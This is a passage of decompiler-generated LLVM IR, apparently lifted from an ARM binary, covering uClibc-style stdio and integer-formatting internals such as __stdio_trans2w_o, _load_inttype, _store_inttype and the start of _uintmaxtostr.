  %v2_ef10 = add i32 %v1_ef10, %v3_ef0c
  store i32 %v2_ef10, i32* %v2_ef0c, align 4
  br label %dec_label_pc_eff0

dec_label_pc_ef1c:                                ; preds = %dec_label_pc_eee0
  %tmp = icmp ult i32 %v2_eef4, %arg2
  br i1 %tmp, label %dec_label_pc_efbc, label %dec_label_pc_ef28

dec_label_pc_ef28:                                ; preds = %dec_label_pc_ef1c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_ef30 = call i32 @memcpy()
  %v0_ef34 = load i32, i32* @r5, align 4
  %v1_ef34 = add i32 %v0_ef34, 16
  %v2_ef34 = inttoptr i32 %v1_ef34 to i32*
  %v3_ef34 = load i32, i32* %v2_ef34, align 4
  %v1_ef38 = add i32 %v0_ef34, 1
  %v2_ef38 = inttoptr i32 %v1_ef38 to i8*
  %v3_ef38 = load i8, i8* %v2_ef38, align 1
  %v1_ef3c = load i32, i32* @r6, align 4
  %v2_ef3c = add i32 %v1_ef3c, %v3_ef34
  %tmp17 = urem i8 %v3_ef38, 2
  %v2_ef40 = icmp eq i8 %tmp17, 0
  store i32 %v2_ef3c, i32* %v2_ef34, align 4
  br i1 %v2_ef40, label %dec_label_pc_eff0, label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef28
  %v0_ef4c = load i32, i32* %r7.global-to-local, align 4
  %v0_ef54 = load i32, i32* @r6, align 4
  %v4_ef58 = call i32 @memrchr(i32 %v0_ef4c, i32 10, i32 %v0_ef54, i32 %v2_ef3c)
  %v2_ef5c = icmp eq i32 %v4_ef58, 0
  br i1 %v2_ef5c, label %dec_label_pc_eff0, label %dec_label_pc_ef64

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ef4c
  %v0_ef64 = load i32, i32* @r5, align 4
  store i32 %v0_ef64, i32* @r0, align 4
  %v0_ef68 = call i32 @__stdio_wcommit()
  %v2_ef6c = icmp eq i32 %v0_ef68, 0
  br i1 %v2_ef6c, label %dec_label_pc_eff0, label %dec_label_pc_ef74

dec_label_pc_ef74:                                ; preds = %dec_label_pc_ef64
  %v0_ef74 = load i32, i32* @r6, align 4
  %v3_ef74 = icmp uge i32 %v0_ef74, %v0_ef68
  %v0_ef68.v0_ef74 = select i1 %v3_ef74, i32 %v0_ef68, i32 %v0_ef74
  store i32 %v0_ef68.v0_ef74, i32* @r4, align 4
  %v2_ef80 = sub i32 %v0_ef74, %v0_ef68.v0_ef74
  %v0_ef84 = load i32, i32* %r7.global-to-local, align 4
  %v2_ef84 = add i32 %v0_ef84, %v2_ef80
  store i32 %v2_ef84, i32* %r7.global-to-local, align 4
  store i32 %v0_ef68.v0_ef74, i32* @r2, align 4
  %v4_ef94 = call i32 @__GI_memchr(i32 %v2_ef84, i32 10, i32 %v0_ef68.v0_ef74, i32 %v2_ef80)
  %v2_ef98 = icmp eq i32 %v4_ef94, 0
  br i1 %v2_ef98, label %dec_label_pc_eff0, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef74
  %v0_efa0 = load i32, i32* @r5, align 4
  %v1_efa0 = add i32 %v0_efa0, 16
  %v2_efa0 = inttoptr i32 %v1_efa0 to i32*
  %v3_efa0 = load i32, i32* %v2_efa0, align 4
  %v0_efa4 = load i32, i32* %r7.global-to-local, align 4
  %v1_efa4 = load i32, i32* @r4, align 4
  %v2_efa4 = sub i32 %v0_efa4, %v4_ef94
  %v2_efa8 = add i32 %v2_efa4, %v1_efa4
  %v2_efac = sub i32 %v3_efa0, %v2_efa8
  %v1_efb0 = load i32, i32* @r6, align 4
  %v2_efb0 = sub i32 %v1_efb0, %v2_efa8
  store i32 %v2_efb0, i32* @r6, align 4
  store i32 %v2_efac, i32* %v2_efa0, align 4
  br label %dec_label_pc_eff0

dec_label_pc_efbc:                                ; preds = %dec_label_pc_ef1c
  %v1_efbc = add i32 %arg3, 8
  %v2_efbc = inttoptr i32 %v1_efbc to i32*
  %v3_efbc = load i32, i32* %v2_efbc, align 4
  %v9_efc0 = icmp eq i32 %v3_eee8, %v3_efbc
  br i1 %v9_efc0, label %dec_label_pc_efdc, label %dec_label_pc_efc8

dec_label_pc_efc8:                                ; preds = %dec_label_pc_efbc
  store i32 %arg3, i32* @r0, align 4
  %v0_efcc = call i32 @__stdio_wcommit()
  %v2_efd0 = icmp eq i32 %v0_efcc, 0
  br i1 %v2_efd0, label %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge, label %bb13

dec_label_pc_efc8.dec_label_pc_efdc_crit_edge:    ; preds = %dec_label_pc_efc8
  %v0_efe4.pre = load i32, i32* @r6, align 4
  %v0_efdc.pre = load i32, i32* @r5, align 4
  %v0_efe0.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_efe8.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_efdc

bb13:                                             ; preds = %dec_label_pc_efc8
  %v1_efd4 = load i32, i32* @r4, align 4
  store i32 %v1_efd4, i32* @r6, align 4
  br label %dec_label_pc_eff0

dec_label_pc_efdc:                                ; preds = %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge, %entry, %dec_label_pc_efbc
  %v2_efe8 = phi i32 [ %v2_efe8.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %v3_eec0, %entry ], [ %v3_eec0, %dec_label_pc_efbc ]
  %v0_efe0 = phi i32 [ %v0_efe0.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_efbc ]
  %v0_efdc = phi i32 [ %v0_efdc.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_efbc ]
  %v0_efe4 = phi i32 [ %v0_efe4.pre, %dec_label_pc_efc8.dec_label_pc_efdc_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_efbc ]
  store i32 %v2_efe8, i32* @r4, align 4
  store i32 %v9_eec0, i32* @r6, align 4
  store i32 %v15_eec0, i32* @lr, align 4
  %v3_efec = inttoptr i32 %v0_efdc to i8*
  %v4_efec = call i32 @__stdio_WRITE(i8* %v3_efec, i32 %v0_efe0, i32 %v0_efe4)
  br label %dec_label_pc_eff0

dec_label_pc_eff0:                                ; preds = %bb13, %dec_label_pc_ef74, %dec_label_pc_ef64, %dec_label_pc_ef4c, %dec_label_pc_ef28, %dec_label_pc_efa0, %bb10, %dec_label_pc_efdc
  %v0_eff0 = load i32, i32* @r6, align 4
  %v2_eff4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_eff4, i32* @r4, align 4
  store i32 %v6_eec0, i32* @r5, align 4
  store i32 %v9_eec0, i32* @r6, align 4
  store i32 %v12_eec0, i32* @r7, align 4
  ret i32 %v0_eff0

; uselistorder directives
  uselistorder i32 %v2_efa8, { 1, 0 }
  uselistorder i32 %v2_ef80, { 1, 0 }
  uselistorder i32 %v0_ef68.v0_ef74, { 1, 2, 0, 3 }
  uselistorder i32 %v0_ef74, { 1, 0, 2 }
  uselistorder i32 %v2_eef4, { 2, 0, 1, 3 }
  uselistorder i32 %v9_eec0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 8, 5, 7, 6, 4, 3, 2 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_eff0, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_efdc, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eff8 = load i32, i32* @r4, align 4
  store i32 %v3_eff8, i32* %stack_var_-8, align 4
  %v3_effc = load i8, i8* %arg1, align 1
  %v4_effc = zext i8 %v3_effc to i32
  store i32 %v4_effc, i32* %r2.global-to-local, align 4
  %v2_f000 = add i32 %tmp, 1
  %v3_f000 = inttoptr i32 %v2_f000 to i8*
  %v4_f000 = load i8, i8* %v3_f000, align 1
  %v5_f000 = zext i8 %v4_f000 to i32
  store i32 %v5_f000, i32* %r3.global-to-local, align 4
  %v4_f004 = mul nuw nsw i32 %v5_f000, 256
  %v5_f004 = or i32 %v4_f004, %v4_effc
  store i32 %v5_f004, i32* %r2.global-to-local, align 4
  %v2_f008 = and i32 %v5_f004, %arg2
  %v4_f008 = icmp eq i32 %v2_f008, 0
  store i1 %v4_f008, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_f008, label %dec_label_pc_f014, label %dec_label_pc_f02c

dec_label_pc_f014:                                ; preds = %entry
  %v1_f014 = and i32 %v5_f004, 2176
  %v2_f014 = icmp eq i32 %v1_f014, 0
  store i1 %v2_f014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f014, label %dec_label_pc_f01c, label %dec_label_pc_f040

dec_label_pc_f01c:                                ; preds = %dec_label_pc_f014
  %v2_f01c = or i32 %v5_f004, %arg2
  store i32 %v2_f01c, i32* %r2.global-to-local, align 4
  %v3_f020 = sdiv i32 %v2_f01c, 256
  store i32 %v3_f020, i32* %r3.global-to-local, align 4
  %v1_f024 = trunc i32 %v3_f020 to i8
  store i8 %v1_f024, i8* %v3_f000, align 1
  %v0_f028 = load i32, i32* %r2.global-to-local, align 4
  %v1_f028 = trunc i32 %v0_f028 to i8
  store i8 %v1_f028, i8* %arg1, align 1
  %v0_f02c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f02c

dec_label_pc_f02c:                                ; preds = %entry, %dec_label_pc_f01c
  %v0_f078 = phi i32 [ %tmp, %entry ], [ %v0_f02c.pre, %dec_label_pc_f01c ]
  %v1_f02c = inttoptr i32 %v0_f078 to i8*
  %v2_f02c = load i8, i8* %v1_f02c, align 1
  %v3_f02c = zext i8 %v2_f02c to i32
  store i32 %v3_f02c, i32* %r2.global-to-local, align 4
  %v1_f030 = add i32 %v0_f078, 1
  %v2_f030 = inttoptr i32 %v1_f030 to i8*
  %v3_f030 = load i8, i8* %v2_f030, align 1
  %v4_f030 = zext i8 %v3_f030 to i32
  store i32 %v4_f030, i32* %r3.global-to-local, align 4
  %v4_f034 = mul nuw nsw i32 %v4_f030, 256
  %v5_f034 = or i32 %v4_f034, %v3_f02c
  store i32 %v5_f034, i32* @ip, align 4
  %v1_f038 = and i32 %v3_f02c, 32
  %v2_f038 = icmp eq i32 %v1_f038, 0
  store i1 %v2_f038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f038, label %dec_label_pc_f068, label %dec_label_pc_f040

dec_label_pc_f040:                                ; preds = %dec_label_pc_f014, %dec_label_pc_f02c
  %v0_f040 = call i32 @__errno_location()
  store i32 %v0_f040, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_f048 = inttoptr i32 %v0_f040 to i32*
  store i32 9, i32* %v2_f048, align 4
  br label %dec_label_pc_f04c

dec_label_pc_f04c:                                ; preds = %dec_label_pc_f090, %dec_label_pc_f040
  %v0_f04c = load i32, i32* @r4, align 4
  %v1_f04c = inttoptr i32 %v0_f04c to i32*
  %v2_f04c = load i32, i32* %v1_f04c, align 4
  %v1_f050 = or i32 %v2_f04c, 8
  store i32 %v1_f050, i32* %r3.global-to-local, align 4
  %v3_f054 = sdiv i32 %v2_f04c, 256
  store i32 %v3_f054, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_f05c = trunc i32 %v3_f054 to i8
  %v3_f05c = add i32 %v0_f04c, 1
  %v4_f05c = inttoptr i32 %v3_f05c to i8*
  store i8 %v1_f05c, i8* %v4_f05c, align 1
  %v0_f060 = load i32, i32* %r3.global-to-local, align 4
  %v1_f060 = trunc i32 %v0_f060 to i8
  %v2_f060 = load i32, i32* @r4, align 4
  %v3_f060 = inttoptr i32 %v2_f060 to i8*
  store i8 %v1_f060, i8* %v3_f060, align 1
  %v2_f064 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f064, i32* @r4, align 4
  ret i32 -1

dec_label_pc_f068:                                ; preds = %dec_label_pc_f02c
  %tmp15 = urem i8 %v2_f02c, 4
  %v2_f068 = icmp eq i8 %tmp15, 0
  store i1 %v2_f068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f068, label %dec_label_pc_f0cc, label %dec_label_pc_f070

dec_label_pc_f070:                                ; preds = %dec_label_pc_f068
  %v1_f070 = and i32 %v3_f02c, 4
  store i32 %v1_f070, i32* @r1, align 4
  %v2_f070 = icmp eq i32 %v1_f070, 0
  store i1 %v2_f070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f070, label %dec_label_pc_f078, label %dec_label_pc_f0a8

dec_label_pc_f078:                                ; preds = %dec_label_pc_f070
  %v1_f078 = add i32 %v0_f078, 20
  %v2_f078 = inttoptr i32 %v1_f078 to i32*
  %v3_f078 = load i32, i32* %v2_f078, align 4
  store i32 %v3_f078, i32* %r2.global-to-local, align 4
  %v1_f07c = add i32 %v0_f078, 16
  %v2_f07c = inttoptr i32 %v1_f07c to i32*
  %v3_f07c = load i32, i32* %v2_f07c, align 4
  store i32 %v3_f07c, i32* %r3.global-to-local, align 4
  %v9_f080 = icmp eq i32 %v3_f078, %v3_f07c
  store i1 %v9_f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f080, label %dec_label_pc_f088, label %dec_label_pc_f090

dec_label_pc_f088:                                ; preds = %dec_label_pc_f078
  %v1_f088 = and i32 %v3_f02c, 2
  %v2_f088 = icmp eq i32 %v1_f088, 0
  store i1 %v2_f088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f088, label %dec_label_pc_f0a8, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %dec_label_pc_f078, %dec_label_pc_f088
  %v1_f090 = and i32 %v4_f034, 1024
  %v2_f090 = icmp eq i32 %v1_f090, 0
  store i1 %v2_f090, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_f090, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_f09c = call i32 @__GI_fseek()
  store i32 %v0_f09c, i32* %r0.global-to-local, align 4
  %v2_f0a0 = icmp eq i32 %v0_f09c, 0
  store i1 %v2_f0a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0a0, label %.dec_label_pc_f0a8_crit_edge, label %dec_label_pc_f04c

.dec_label_pc_f0a8_crit_edge:                     ; preds = %dec_label_pc_f090
  %v0_f0a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %.dec_label_pc_f0a8_crit_edge, %dec_label_pc_f070, %dec_label_pc_f088
  %v2_f0b8 = phi i32 [ %v0_f0a8.pre, %.dec_label_pc_f0a8_crit_edge ], [ %v0_f078, %dec_label_pc_f070 ], [ %v0_f078, %dec_label_pc_f088 ]
  %v1_f0a8 = inttoptr i32 %v2_f0b8 to i32*
  %v2_f0a8 = load i32, i32* %v1_f0a8, align 4
  store i32 %v2_f0a8, i32* %r3.global-to-local, align 4
  %v1_f0ac = add i32 %v2_f0b8, 8
  %v2_f0ac = inttoptr i32 %v1_f0ac to i32*
  %v3_f0ac = load i32, i32* %v2_f0ac, align 4
  store i32 %v3_f0ac, i32* %r1.global-to-local, align 4
  %v1_f0b0 = and i32 %v2_f0a8, -4
  store i32 %v1_f0b0, i32* %r3.global-to-local, align 4
  %v3_f0b4 = sdiv i32 %v2_f0a8, 256
  store i32 %v3_f0b4, i32* %r2.global-to-local, align 4
  %v1_f0b8 = trunc i32 %v3_f0b4 to i8
  %v3_f0b8 = add i32 %v2_f0b8, 1
  %v4_f0b8 = inttoptr i32 %v3_f0b8 to i8*
  store i8 %v1_f0b8, i8* %v4_f0b8, align 1
  %v0_f0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_f0bc = load i32, i32* @r4, align 4
  %v2_f0bc = add i32 %v1_f0bc, 20
  %v3_f0bc = inttoptr i32 %v2_f0bc to i32*
  store i32 %v0_f0bc, i32* %v3_f0bc, align 4
  %v0_f0c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f0c0 = trunc i32 %v0_f0c0 to i8
  %v2_f0c0 = load i32, i32* @r4, align 4
  %v3_f0c0 = inttoptr i32 %v2_f0c0 to i8*
  store i8 %v1_f0c0, i8* %v3_f0c0, align 1
  %v0_f0c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0c4 = load i32, i32* @r4, align 4
  %v2_f0c4 = add i32 %v1_f0c4, 24
  %v3_f0c4 = inttoptr i32 %v2_f0c4 to i32*
  store i32 %v0_f0c4, i32* %v3_f0c4, align 4
  %v0_f0c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0c8 = load i32, i32* @r4, align 4
  %v2_f0c8 = add i32 %v1_f0c8, 16
  %v3_f0c8 = inttoptr i32 %v2_f0c8 to i32*
  store i32 %v0_f0c8, i32* %v3_f0c8, align 4
  %v0_f0cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f068, %dec_label_pc_f0a8
  %v2_f0d8 = phi i32 [ %v0_f078, %dec_label_pc_f068 ], [ %v0_f0cc.pre, %dec_label_pc_f0a8 ]
  %v1_f0cc = inttoptr i32 %v2_f0d8 to i32*
  %v2_f0cc = load i32, i32* %v1_f0cc, align 4
  %v1_f0d0 = or i32 %v2_f0cc, 64
  store i32 %v1_f0d0, i32* %r2.global-to-local, align 4
  %v3_f0d4 = sdiv i32 %v2_f0cc, 256
  store i32 %v3_f0d4, i32* %r3.global-to-local, align 4
  %v1_f0d8 = trunc i32 %v3_f0d4 to i8
  %v3_f0d8 = add i32 %v2_f0d8, 1
  %v4_f0d8 = inttoptr i32 %v3_f0d8 to i8*
  store i8 %v1_f0d8, i8* %v4_f0d8, align 1
  %v0_f0dc = load i32, i32* @r4, align 4
  %v1_f0dc = add i32 %v0_f0dc, 1
  %v2_f0dc = inttoptr i32 %v1_f0dc to i8*
  %v3_f0dc = load i8, i8* %v2_f0dc, align 1
  %v4_f0dc = zext i8 %v3_f0dc to i32
  %v3_f0e0 = mul nuw nsw i32 %v4_f0dc, 256
  store i32 %v3_f0e0, i32* %r3.global-to-local, align 4
  %v1_f0e4 = and i32 %v3_f0e0, 2816
  store i32 %v1_f0e4, i32* %r0.global-to-local, align 4
  %v2_f0e4 = icmp eq i32 %v1_f0e4, 0
  store i1 %v2_f0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0e4, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_f0cc
  %v2_f0e8 = add i32 %v0_f0dc, 12
  %v3_f0e8 = inttoptr i32 %v2_f0e8 to i32*
  %v4_f0e8 = load i32, i32* %v3_f0e8, align 4
  store i32 %v4_f0e8, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_f0cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_f0f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f0f0 = trunc i32 %v0_f0f0 to i8
  %v3_f0f0 = inttoptr i32 %v0_f0dc to i8*
  store i8 %v1_f0f0, i8* %v3_f0f0, align 1
  %v0_f0f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0f4, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_f0f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f0f4 = load i32, i32* @r4, align 4
  %v3_f0f4 = add i32 %v2_f0f4, 28
  %v4_f0f4 = inttoptr i32 %v3_f0f4 to i32*
  store i32 %v1_f0f4, i32* %v4_f0f4, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_f0f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f0f8, i32* @r4, align 4
  %v8_f0f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_f0f8

; uselistorder directives
  uselistorder i32 %v3_f0e0, { 1, 0 }
  uselistorder i32 %v3_f0d4, { 1, 0 }
  uselistorder i32 %v3_f0b4, { 1, 0 }
  uselistorder i32 %v2_f0b8, { 0, 2, 1 }
  uselistorder i1 %v2_f068, { 1, 0 }
  uselistorder i32 %v3_f054, { 1, 0 }
  uselistorder i32 %v3_f02c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_f078, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_f020, { 1, 0 }
  uselistorder i32 %v5_f004, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_f0cc, { 1, 0 }
  uselistorder label %dec_label_pc_f0a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f090, { 1, 0 }
  uselistorder label %dec_label_pc_f040, { 1, 0 }
  uselistorder label %dec_label_pc_f02c, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_f0fc = load i32, i32* @r2, align 4
  %v1_f0fc = icmp slt i32 %v0_f0fc, 0
  %v0_f100 = load i32, i32* @r0, align 4
  %v1_f104 = and i32 %v0_f100, 2048
  %v2_f138 = icmp eq i32 %v1_f104, 0
  br i1 %v1_f0fc, label %dec_label_pc_f138, label %dec_label_pc_f10c

dec_label_pc_f10c:                                ; preds = %entry
  br i1 %v2_f138, label %dec_label_pc_f114, label %dec_label_pc_f140

dec_label_pc_f114:                                ; preds = %dec_label_pc_f10c
  %v7_f114 = icmp eq i32 %v0_f100, 256
  %v0_f118 = load i32, i32* @r1, align 4
  %v1_f118 = inttoptr i32 %v0_f118 to i32*
  %v2_f118 = load i32, i32* %v1_f118, align 4
  %v2_f11c = urem i32 %v2_f118, 256
  %v2_f11c.v2_f118 = select i1 %v7_f114, i32 %v2_f11c, i32 %v2_f118
  br i1 %v7_f114, label %.thread, label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f114
  %v7_f124 = icmp eq i32 %v0_f100, 512
  br i1 %v7_f124, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f124
  %v4_f12c = urem i32 %v2_f11c.v2_f118, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f124, %dec_label_pc_f114, %bb
  %v1_f134 = phi i32 [ %v2_f118, %dec_label_pc_f124 ], [ %v2_f11c, %dec_label_pc_f114 ], [ %v4_f12c, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_f134

dec_label_pc_f138:                                ; preds = %entry
  br i1 %v2_f138, label %dec_label_pc_f148, label %dec_label_pc_f140

dec_label_pc_f140:                                ; preds = %dec_label_pc_f10c, %dec_label_pc_f138
  %v0_f140 = load i32, i32* @r1, align 4
  %v1_f140 = inttoptr i32 %v0_f140 to i32*
  %v2_f140 = load i32, i32* %v1_f140, align 4
  %v3_f140 = add i32 %v0_f140, 4
  %v4_f140 = inttoptr i32 %v3_f140 to i32*
  %v5_f140 = load i32, i32* %v4_f140, align 4
  store i32 %v5_f140, i32* @r1, align 4
  ret i32 %v2_f140

dec_label_pc_f148:                                ; preds = %dec_label_pc_f138
  %v7_f148 = icmp eq i32 %v0_f100, 256
  %v0_f14c = load i32, i32* @r1, align 4
  %v1_f14c = inttoptr i32 %v0_f14c to i32*
  %v2_f14c = load i32, i32* %v1_f14c, align 4
  %v2_f150 = urem i32 %v2_f14c, 256
  %v2_f150.v2_f14c = select i1 %v7_f148, i32 %v2_f150, i32 %v2_f14c
  br i1 %v7_f148, label %.thread2, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f148
  %v7_f158 = icmp eq i32 %v0_f100, 512
  br i1 %v7_f158, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_f158
  %v4_f15c = mul i32 %v2_f150.v2_f14c, 65536
  %v4_f160 = sdiv i32 %v4_f15c, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f158, %dec_label_pc_f148, %bb5
  %v0_f164 = phi i32 [ %v2_f14c, %dec_label_pc_f158 ], [ %v2_f150, %dec_label_pc_f148 ], [ %v4_f160, %bb5 ]
  %v3_f164 = ashr i32 %v0_f164, 31
  store i32 %v3_f164, i32* @r1, align 4
  ret i32 %v0_f164

; uselistorder directives
  uselistorder i32 %v0_f164, { 1, 0 }
  uselistorder i32 %v2_f150, { 1, 0 }
  uselistorder i32 %v2_f14c, { 1, 2, 0 }
  uselistorder i32 %v2_f11c, { 1, 0 }
  uselistorder i32 %v2_f118, { 1, 2, 0 }
  uselistorder i1 %v2_f138, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f140, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_f16c = icmp eq i32 %arg2, 256
  br i1 %v7_f16c, label %dec_label_pc_f198, label %dec_label_pc_f174

dec_label_pc_f174:                                ; preds = %entry
  %v7_f174 = icmp eq i32 %arg2, 2048
  br i1 %v7_f174, label %dec_label_pc_f17c, label %dec_label_pc_f184

dec_label_pc_f17c:                                ; preds = %dec_label_pc_f174
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_f17c = add i32 %tmp2, 4
  %v6_f17c = inttoptr i32 %v5_f17c to i32*
  store i32 %arg4, i32* %v6_f17c, align 4
  ret i32 %tmp2

dec_label_pc_f184:                                ; preds = %dec_label_pc_f174
  %v7_f184 = icmp eq i32 %arg2, 512
  %v4_f188 = sdiv i32 %arg3, 256
  store i32 %v4_f188, i32* @ip, align 4
  br i1 %v7_f184, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_f184
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_f184
  %v1_f194 = trunc i32 %v4_f188 to i8
  %v4_f194 = add i32 %tmp2, 1
  %v5_f194 = inttoptr i32 %v4_f194 to i8*
  store i8 %v1_f194, i8* %v5_f194, align 1
  br label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_f188, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_f198, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_f1a4 = icmp slt i32 %arg4, 0
  %v2_f1a4 = icmp eq i32 %arg4, 0
  store i1 %v2_f1a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_f1a4, label %dec_label_pc_f1bc, label %dec_label_pc_f1dc

dec_label_pc_f1bc:                                ; preds = %entry
  %v1_f1bc = icmp slt i32 %arg3, 0
  %v2_f1bc = icmp eq i32 %arg3, 0
  store i1 %v2_f1bc, i1* %cpsr_z.global-to-local, align 1
  %v1_f1c0 = sub i32 0, %arg4
  store i32 %v1_f1c0, i32* %r7.global-to-local, align 4
  br i1 %v1_f1bc, label %dec_label_pc_f1c8, label %dec_label_pc_f1dc

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f1bc
  %v1_f1cc = sub i32 0, %arg2
  store i32 %v1_f1cc, i32* %r5.global-to-local, align 4
  %v2_f1cc = icmp eq i32 %arg2, 0
  %v2_f1d0 = icmp eq i1 %v2_f1cc, false
  %v5_f1d0 = sext i1 %v2_f1d0 to i32
  %v6_f1d0 = sub i32 %v5_f1d0, %arg3
